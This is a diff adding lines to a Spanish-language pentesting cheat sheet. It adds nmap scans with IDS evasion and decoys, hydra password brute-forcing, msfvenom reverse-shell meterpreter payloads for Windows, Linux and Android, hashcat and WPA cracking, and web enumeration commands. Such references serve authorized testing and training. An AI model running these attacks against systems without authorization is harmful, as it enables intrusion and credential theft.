@@ -81,8 +81,16 @@ Técnicas y herramientas utilizadas para obtener información pública de un obj
 ## Nmap - Escaneo de Red
 ```bash
 nmap -sS 192.168.1.1      # Escaneo SYN (rápido y sigiloso)
+nmap -sT 192.168.1.1      # Escaneo TCP (conexión completa)
+nmap -sU -p- 192.168.1.1 # Escaneo de puertos UDP
 nmap -sV 192.168.1.1      # Detección de versiones de servicios
 nmap -A 192.168.1.1       # Escaneo agresivo (OS, scripts, traceroute)
+nmap --script=vuln 192.168.1.1  # Buscar vulnerabilidades
+nmap -oN output.txt 192.168.1.1  # Formato normal
+nmap -oX output.xml 192.168.1.1  # Formato XML
+nmap -D RND:10 192.168.1.1  # Uso de decoys
+nmap -sS --scan-delay 500ms 192.168.1.1  # Evitar detección IDS
+nmap -p 80 --badsum 192.168.1.1  # Prueba de firewall
 ```
 
 ---
@@ -93,17 +101,21 @@ nmap -A 192.168.1.1       # Escaneo agresivo (OS, scripts, traceroute)
 ```bash
 hydra -l admin -P passwords.txt ssh://192.168.1.1  # SSH
 hydra -l root -P passwords.txt ftp://192.168.1.1  # FTP
+hydra -l admin -P passwords.txt 192.168.1.1 http-get /admin  # HTTP
 ```
 
 ## Payloads con Msfvenom
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<P> -f exe > shell.exe  # Windows
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<P> -f elf > shell.elf  # Linux
+msfvenom -p android/meterpreter/reverse_tcp LHOST=<IP> LPORT=<P> -o shell.apk  # Android
 ```
 
 ## Ataques con Hashcat
 ```bash
 hashcat -m 0 -a 0 hash.txt rockyou.txt  # Ataque de diccionario
+hashcat -m 1000 -a 3 hash.txt ?a?a?a?a  # Ataque de máscara
+hashcat -m 2500 -a 0 handshake.hccapx wordlist.txt  # WPA/WPA2
 ```
 
 ---
@@ -113,6 +125,8 @@ hashcat -m 0 -a 0 hash.txt rockyou.txt  # Ataque de diccionario
 ## Web Enumeration
 ```bash
 gobuster dir -u <url> -w /usr/share/wordlists/dirb/common.txt  # Buscar directorios
+gobuster dns -d <dominio> -w /usr/share/wordlists/subdomains.txt  # Subdominios
+python3 dirsearch.py -u <url> -e php,html,txt  # Dirsearch
 wpscan --url <url> --enumerate vp  # Vulnerabilidades en WordPress
 ```
 
@@ -124,6 +138,7 @@ curl -I <url>  # Obtener encabezados HTTP
 ## SSLScan - Auditoría SSL/TLS
 ```bash
 sslscan <dominio>  # Escaneo general
+sslscan --no-failed --port 443 <dominio>  # Solo resultados exitosos
 ```
 
 ---
